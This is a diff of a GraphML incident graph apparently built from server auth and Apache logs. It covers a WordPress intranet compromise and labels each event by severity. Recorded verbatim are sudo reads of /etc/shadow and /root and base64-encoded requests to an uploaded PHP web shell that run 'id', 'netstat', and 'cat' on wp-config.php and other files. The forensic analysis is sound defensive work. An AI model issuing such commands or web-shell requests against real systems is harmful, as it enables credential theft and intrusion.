@@ -6,816 +6,705 @@
   <key id="d21" for="node" attr.name="method" attr.type="string" />
   <key id="d20" for="node" attr.name="status_code" attr.type="long" />
   <key id="d19" for="node" attr.name="path" attr.type="string" />
-  <key id="d18" for="node" attr.name="last_seen" attr.type="string" />
-  <key id="d17" for="node" attr.name="first_seen" attr.type="string" />
-  <key id="d16" for="node" attr.name="timestamp" attr.type="string" />
-  <key id="d15" for="node" attr.name="username" attr.type="string" />
-  <key id="d14" for="node" attr.name="pwd" attr.type="string" />
-  <key id="d13" for="node" attr.name="target_user" attr.type="string" />
-  <key id="d12" for="node" attr.name="tty" attr.type="string" />
-  <key id="d11" for="node" attr.name="event_id" attr.type="string" />
-  <key id="d10" for="node" attr.name="actor" attr.type="string" />
-  <key id="d9" for="node" attr.name="source_ip" attr.type="string" />
-  <key id="d8" for="node" attr.name="command" attr.type="string" />
-  <key id="d7" for="node" attr.name="source_file" attr.type="string" />
-  <key id="d6" for="node" attr.name="message" attr.type="string" />
-  <key id="d5" for="node" attr.name="auth_type" attr.type="string" />
-  <key id="d4" for="node" attr.name="severity" attr.type="string" />
-  <key id="d3" for="node" attr.name="display_label" attr.type="string" />
-  <key id="d2" for="node" attr.name="label" attr.type="string" />
-  <key id="d1" for="node" attr.name="ip" attr.type="string" />
+  <key id="d18" for="node" attr.name="ip" attr.type="string" />
+  <key id="d17" for="node" attr.name="timestamp" attr.type="string" />
+  <key id="d16" for="node" attr.name="pwd" attr.type="string" />
+  <key id="d15" for="node" attr.name="target_user" attr.type="string" />
+  <key id="d14" for="node" attr.name="tty" attr.type="string" />
+  <key id="d13" for="node" attr.name="event_id" attr.type="string" />
+  <key id="d12" for="node" attr.name="actor" attr.type="string" />
+  <key id="d11" for="node" attr.name="source_ip" attr.type="string" />
+  <key id="d10" for="node" attr.name="command" attr.type="string" />
+  <key id="d9" for="node" attr.name="source_file" attr.type="string" />
+  <key id="d8" for="node" attr.name="message" attr.type="string" />
+  <key id="d7" for="node" attr.name="auth_type" attr.type="string" />
+  <key id="d6" for="node" attr.name="severity" attr.type="string" />
+  <key id="d5" for="node" attr.name="display_label" attr.type="string" />
+  <key id="d4" for="node" attr.name="label" attr.type="string" />
+  <key id="d3" for="node" attr.name="username" attr.type="string" />
+  <key id="d2" for="node" attr.name="last_seen" attr.type="string" />
+  <key id="d1" for="node" attr.name="first_seen" attr.type="string" />
   <key id="d0" for="node" attr.name="node_type" attr.type="string" />
   <graph edgedefault="directed">
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:9">
-      <data key="d0">IPAddress</data>
-      <data key="d1">243.23.54.175</data>
-      <data key="d2">243.23.54.175</data>
-      <data key="d3">243.23.54.175</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:10">
-      <data key="d0">AuthEvent</data>
-      <data key="d4">medium</data>
-      <data key="d5">ssh</data>
-      <data key="d2">User Login Activity in Server</data>
-      <data key="d6">[sshd] [943610]: Accepted password for root from 243.23.54.175 port 37190 ssh2</data>
-      <data key="d7">OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log</data>
-      <data key="d8">accepted</data>
-      <data key="d9">243.23.54.175</data>
-      <data key="d10">243.23.54.175</data>
-      <data key="d11">37</data>
-      <data key="d12" />
-      <data key="d13">root</data>
-      <data key="d14" />
-      <data key="d15">root</data>
-      <data key="d16">2025-04-29T05:35:51.000000+00:00</data>
-      <data key="d3">accepted (User Login Activity in Server)</data>
-    </node>
     <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:2">
       <data key="d0">User</data>
-      <data key="d17">2022-01-18T12:39:01.000000+00:00</data>
-      <data key="d18">2025-04-29T06:05:31.000000+00:00</data>
-      <data key="d15">root</data>
-      <data key="d2">root</data>
-      <data key="d3">root</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:14">
-      <data key="d0">IPAddress</data>
-      <data key="d1">71.238.128.110</data>
-      <data key="d2">71.238.128.110</data>
-      <data key="d3">71.238.128.110</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:15">
-      <data key="d0">AuthEvent</data>
-      <data key="d4">medium</data>
-      <data key="d5">ssh</data>
-      <data key="d2">SSH Failed Login Attempt</data>
-      <data key="d6">[sshd] [951322]: Failed password for root from 71.238.128.110 port 54700 ssh2</data>
-      <data key="d7">OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log</data>
-      <data key="d8">failed</data>
-      <data key="d9">71.238.128.110</data>
-      <data key="d10">71.238.128.110</data>
-      <data key="d11">43</data>
-      <data key="d12" />
-      <data key="d13">root</data>
-      <data key="d14" />
-      <data key="d15">root</data>
-      <data key="d16">2025-04-29T06:05:31.000000+00:00</data>
-      <data key="d3">failed (SSH Failed Login Attempt)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:11">
-      <data key="d0">AuthEvent</data>
-      <data key="d4">medium</data>
-      <data key="d5">session</data>
-      <data key="d2">User Login Activity in Server</data>
-      <data key="d6">[systemd-logind  pid: 623] New session 44433 of user root.</data>
-      <data key="d7">OS:D:\0experiment\1-1-plaso-sec\data\evidences\var\log\auth.log</data>
-      <data key="d8">new_session</data>
-      <data key="d9" />
-      <data key="d10">root</data>
-      <data key="d11">38</data>
-      <data key="d12" />
-      <data key="d13">root</data>
-      <data key="d14" />
-      <data key="d15">root</data>
-      <data key="d16">2025-04-29T05:35:51.000000+00:00</data>
-      <data key="d3">new_session (User Login Activity in Server)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:0">
-      <data key="d0">User</data>
-      <data key="d17">2022-01-18T12:39:01.000000+00:00</data>
-      <data key="d18">2022-01-18T12:39:11.000000+00:00</data>
-      <data key="d15">phopkins</data>
-      <data key="d2">phopkins</data>
+      <data key="d1">2022-01-18T12:39:01.000000+00:00</data>
+      <data key="d2">2022-01-18T12:39:11.000000+00:00</data>
       <data key="d3">phopkins</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:3">
-      <data key="d0">AuthEvent</data>
-      <data key="d4">high</data>
-      <data key="d5">sudo</data>
-      <data key="d2">Sudo Command Executed in Web Directory</data>
-      <data key="d6">[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list</data>
-      <data key="d7">OS:evidences\\\\auth.log</data>
-      <data key="d8">list</data>
-      <data key="d9" />
-      <data key="d10">phopkins</data>
-      <data key="d11">32</data>
-      <data key="d12">pts/1</data>
-      <data key="d13">root</data>
-      <data key="d14">/var/www/intranet.price.fox.org/wp-content/uploads/2022/01</data>
-      <data key="d15">phopkins</data>
-      <data key="d16">2022-01-18T13:14:41.000000+00:00</data>
-      <data key="d3">list (Sudo Command Executed in Web Directory)</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:4">
-      <data key="d0">AuthEvent</data>
-      <data key="d4">critical</data>
-      <data key="d5">sudo</data>
-      <data key="d2">Sudo List Command Executed from Web Directory</data>
-      <data key="d6">[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/</data>
-      <data key="d7">OS:evidences\\\\auth.log</data>
-      <data key="d8">/bin/ls -laR /root/</data>
-      <data key="d9" />
-      <data key="d10">phopkins</data>
-      <data key="d11">33</data>
-      <data key="d12">pts/1</data>
-      <data key="d13">root</data>
-      <data key="d14">/var/www/intranet.price.fox.org/wp-content/uploads/2022/01</data>
-      <data key="d15">phopkins</data>
-      <data key="d16">2022-01-18T13:14:43.000000+00:00</data>
-      <data key="d3">/bin/ls -laR /root/ (Sudo List Command Executed from Web Directory)</data>
+      <data key="d4">phopkins</data>
+      <data key="d5">phopkins</data>
     </node>
     <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:5">
       <data key="d0">AuthEvent</data>
-      <data key="d4">critical</data>
-      <data key="d5">sudo</data>
-      <data key="d2">Sudo Read Command Executed from Web Directory</data>
-      <data key="d6">[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow</data>
-      <data key="d7">OS:evidences\\\\auth.log</data>
-      <data key="d8">/bin/cat /etc/shadow</data>
-      <data key="d9" />
-      <data key="d10">phopkins</data>
-      <data key="d11">34</data>
-      <data key="d12">pts/1</data>
-      <data key="d13">root</data>
-      <data key="d14">/var/www/intranet.price.fox.org/wp-content/uploads/2022/01</data>
-      <data key="d15">phopkins</data>
-      <data key="d16">2022-01-18T13:14:49.000000+00:00</data>
-      <data key="d3">/bin/cat /etc/shadow (Sudo Read Command Executed from Web Directory)</data>
+      <data key="d6">high</data>
+      <data key="d7">sudo</data>
+      <data key="d4">Sudo Command Executed in Web Directory</data>
+      <data key="d8">[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=list</data>
+      <data key="d9">OS:evidences\\\\auth.log</data>
+      <data key="d10">list</data>
+      <data key="d11" />
+      <data key="d12">phopkins</data>
+      <data key="d13">32</data>
+      <data key="d14">pts/1</data>
+      <data key="d15">root</data>
+      <data key="d16">/var/www/intranet.price.fox.org/wp-content/uploads/2022/01</data>
+      <data key="d3">phopkins</data>
+      <data key="d17">2022-01-18T13:14:41.000000+00:00</data>
+      <data key="d5">list (Sudo Command Executed in Web Directory)</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:38">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:4">
+      <data key="d0">User</data>
+      <data key="d1">2022-01-18T12:39:01.000000+00:00</data>
+      <data key="d3">root</data>
+      <data key="d4">root</data>
+      <data key="d5">root</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:6">
+      <data key="d0">AuthEvent</data>
+      <data key="d6">critical</data>
+      <data key="d7">sudo</data>
+      <data key="d4">Sudo List Command Executed from Web Directory</data>
+      <data key="d8">[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/ls -laR /root/</data>
+      <data key="d9">OS:evidences\\\\auth.log</data>
+      <data key="d10">/bin/ls -laR /root/</data>
+      <data key="d11" />
+      <data key="d12">phopkins</data>
+      <data key="d13">33</data>
+      <data key="d14">pts/1</data>
+      <data key="d15">root</data>
+      <data key="d16">/var/www/intranet.price.fox.org/wp-content/uploads/2022/01</data>
+      <data key="d3">phopkins</data>
+      <data key="d17">2022-01-18T13:14:43.000000+00:00</data>
+      <data key="d5">/bin/ls -laR /root/ (Sudo List Command Executed from Web Directory)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:7">
+      <data key="d0">AuthEvent</data>
+      <data key="d6">critical</data>
+      <data key="d7">sudo</data>
+      <data key="d4">Sudo Read Command Executed from Web Directory</data>
+      <data key="d8">[sudo] phopkins : TTY=pts/1 ; PWD=/var/www/intranet.price.fox.org/wp-content/uploads/2022/01 ; USER=root ; COMMAND=/bin/cat /etc/shadow</data>
+      <data key="d9">OS:evidences\\\\auth.log</data>
+      <data key="d10">/bin/cat /etc/shadow</data>
+      <data key="d11" />
+      <data key="d12">phopkins</data>
+      <data key="d13">34</data>
+      <data key="d14">pts/1</data>
+      <data key="d15">root</data>
+      <data key="d16">/var/www/intranet.price.fox.org/wp-content/uploads/2022/01</data>
+      <data key="d3">phopkins</data>
+      <data key="d17">2022-01-18T13:14:49.000000+00:00</data>
+      <data key="d5">/bin/cat /etc/shadow (Sudo Read Command Executed from Web Directory)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:21">
       <data key="d0">IPAddress</data>
-      <data key="d1">172.17.130.196</data>
-      <data key="d2">172.17.130.196</data>
-      <data key="d3">172.17.130.196</data>
+      <data key="d18">172.17.130.196</data>
+      <data key="d4">172.17.130.196</data>
+      <data key="d5">172.17.130.196</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:39">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:22">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
       <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zope</data>
-      <data key="d11">7</data>
+      <data key="d13">7</data>
       <data key="d20">404</data>
       <data key="d21">GET</data>
-      <data key="d2">Exploit Framework User Agent</data>
-      <data key="d6">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d4">Exploit Framework User Agent</data>
+      <data key="d8">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
       <data key="d22">Mozilla/4.0</data>
-      <data key="d16">2022-01-18T12:37:49.000000+00:00</data>
-      <data key="d3">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
+      <data key="d17">2022-01-18T12:37:49.000000+00:00</data>
+      <data key="d5">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:36">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:19">
       <data key="d0">Page</data>
       <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zope</data>
-      <data key="d3">/wp-includes/js/tinymce/skins/wordpress/images/zope</data>
+      <data key="d5">/wp-includes/js/tinymce/skins/wordpress/images/zope</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:41">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:24">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
       <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zorum</data>
-      <data key="d11">8</data>
+      <data key="d13">8</data>
       <data key="d20">404</data>
       <data key="d21">GET</data>
-      <data key="d2">Exploit Framework User Agent</data>
-      <data key="d6">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d4">Exploit Framework User Agent</data>
+      <data key="d8">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
       <data key="d22">Mozilla/4.0</data>
-      <data key="d16">2022-01-18T12:37:49.000000+00:00</data>
-      <data key="d3">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
+      <data key="d17">2022-01-18T12:37:49.000000+00:00</data>
+      <data key="d5">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:40">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:23">
       <data key="d0">Page</data>
       <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zorum</data>
-      <data key="d3">/wp-includes/js/tinymce/skins/wordpress/images/zorum</data>
+      <data key="d5">/wp-includes/js/tinymce/skins/wordpress/images/zorum</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:43">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:26">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">172.17.130.196</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
       <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zt</data>
-      <data key="d11">9</data>
+      <data key="d13">9</data>
       <data key="d20">404</data>
       <data key="d21">GET</data>
-      <data key="d2">Exploit Framework User Agent</data>
-      <data key="d6">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zt HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d4">Exploit Framework User Agent</data>
+      <data key="d8">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zt HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
       <data key="d22">Mozilla/4.0</data>
-      <data key="d16">2022-01-18T12:37:49.000000+00:00</data>
-      <data key="d3">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
+      <data key="d17">2022-01-18T12:37:49.000000+00:00</data>
+      <data key="d5">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
     </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:42">
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:25">
       <data key="d0">Page</data>
       <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zt</data>
-      <data key="d3">/wp-includes/js/tinymce/skins/wordpress/images/zt</data>
+      <data key="d5">/wp-includes/js/tinymce/skins/wordpress/images/zt</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:18">
+      <data key="d0">IPAddress</data>
+      <data key="d18">192.168.115.21</data>
+      <data key="d4">192.168.115.21</data>
+      <data key="d5">192.168.115.21</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:20">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">192.168.115.21</data>
+      <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zope</data>
+      <data key="d13">6</data>
+      <data key="d20">404</data>
+      <data key="d21">GET</data>
+      <data key="d4">Exploit Framework User Agent</data>
+      <data key="d8">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 192.168.115.21 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">Mozilla/4.0</data>
+      <data key="d17">2022-01-18T12:37:49.000000+00:00</data>
+      <data key="d5">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:27">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">medium</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/</data>
+      <data key="d13">10</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">HTTP Request with Suspicious User Agent</data>
+      <data key="d8">http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:00.000000+00:00</data>
+      <data key="d5">GET / (HTTP Request with Suspicious User Agent)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:9">
+      <data key="d0">Page</data>
+      <data key="d19">/</data>
+      <data key="d5">/</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:28">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">medium</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/?p=5</data>
+      <data key="d13">11</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">HTTP Request with Suspicious User Agent</data>
+      <data key="d8">http_request: GET /?p=5 HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:00.000000+00:00</data>
+      <data key="d5">GET /?p=5 (HTTP Request with Suspicious User Agent)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:30">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">medium</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-admin/admin-ajax.php</data>
+      <data key="d13">12</data>
+      <data key="d20">200</data>
+      <data key="d21">POST</data>
+      <data key="d4">HTTP Request with Suspicious User Agent</data>
+      <data key="d8">http_request: POST /wp-admin/admin-ajax.php HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:01.000000+00:00</data>
+      <data key="d5">POST /wp-admin/admin... (HTTP Request with Suspicious User Agent)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:29">
+      <data key="d0">Page</data>
+      <data key="d19">/wp-admin/admin-ajax.php</data>
+      <data key="d5">/wp-admin/admin-ajax.php</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:32">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd</data>
+      <data key="d13">13</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Sysinfo Commands in HTTP Request</data>
+      <data key="d23">["id"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpZCJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["id"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:04.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Sysinfo Commands in HTTP Request)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:31">
+      <data key="d0">Page</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php</data>
+      <data key="d5">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:33">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D</data>
+      <data key="d13">14</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">Network Commands in HTTP Request</data>
+      <data key="d23">["netstat", "-t"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJuZXRzdGF0IiwgIi10Il0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["netstat", "-t"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:06.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Network Commands in HTTP Request)</data>
     </node>
     <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:35">
-      <data key="d0">IPAddress</data>
-      <data key="d1">192.168.115.21</data>
-      <data key="d2">192.168.115.21</data>
-      <data key="d3">192.168.115.21</data>
-    </node>
-    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:37">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">high</data>
-      <data key="d10">192.168.115.21</data>
-      <data key="d19">/wp-includes/js/tinymce/skins/wordpress/images/zope</data>
-      <data key="d11">6</data>
-      <data key="d20">404</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D</data>
+      <data key="d13">16</data>
+      <data key="d20">200</data>
       <data key="d21">GET</data>
-      <data key="d2">Exploit Framework User Agent</data>
-      <data key="d6">http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 192.168.115.21 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</data>
-      <data key="d7">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
-      <data key="d22">Mozilla/4.0</data>
-      <data key="d16">2022-01-18T12:37:49.000000+00:00</data>
-      <data key="d3">GET /wp-includes/js/... (Exploit Framework User Agent)</data>
+      <data key="d4">Network Commands in HTTP Request</data>
+      <data key="d23">["ip", "addr"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJpcCIsICJhZGRyIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["ip", "addr"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:09.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (Network Commands in HTTP Request)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:34">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd</data>
+      <data key="d13">15</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">File Read Commands in HTTP Request</data>
+      <data key="d23">["cat", "/etc/resolv.conf"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9yZXNvbHYuY29uZiJd HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/etc/resolv.conf"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:08.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (File Read Commands in HTTP Request)</data>
+    </node>
+    <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:42">
+      <data key="d0">HTTPRequest</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D</data>
+      <data key="d13">23</data>
+      <data key="d20">200</data>
+      <data key="d21">GET</data>
+      <data key="d4">File Read Commands in HTTP Request</data>
+      <data key="d23">["cat", "/var/www/intranet.price.fox.org/wp-config.php"]</data>
+      <data key="d8">http_request: GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL3Zhci93d3cvaW50cmFuZXQucHJpY2UuZm94Lm9yZy93cC1jb25maWcucGhwIl0%3D HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1 [DECODED: ["cat", "/var/www/intranet.price.fox.org/wp-config.php"]]</data>
+      <data key="d9">OS:evidences\\\\apache2\\\\intranet.price.fox.org-access.log.2</data>
+      <data key="d22">python-requests/2.27.1</data>
+      <data key="d17">2022-01-18T12:38:23.000000+00:00</data>
+      <data key="d5">GET /wp-content/uplo... (File Read Commands in HTTP Request)</data>
     </node>
     <node id="4:31b9e421-2d7c-458e-9a94-5e084a0ec309:44">
       <data key="d0">HTTPRequest</data>
-      <data key="d4">medium</data>
-      <data key="d10">172.17.130.196</data>
-      <data key="d19">/</data>
-      <data key="d11">10</data>
+      <data key="d6">high</data>
+      <data key="d12">172.17.130.196</data>
+      <data key="d19">/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJjYXQiLCAiL2V0Yy9wcm9maWxlIl0%3D</data>
+      <data key="d13">25</data>
       <data key="d20">200</data>
       <data key="d21">GET</data>
-      <data key="d2">HTTP Request with Suspicious User Agent</data>
-      <data key="d6">http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 user_agent: python-requests/2.27.1</data>
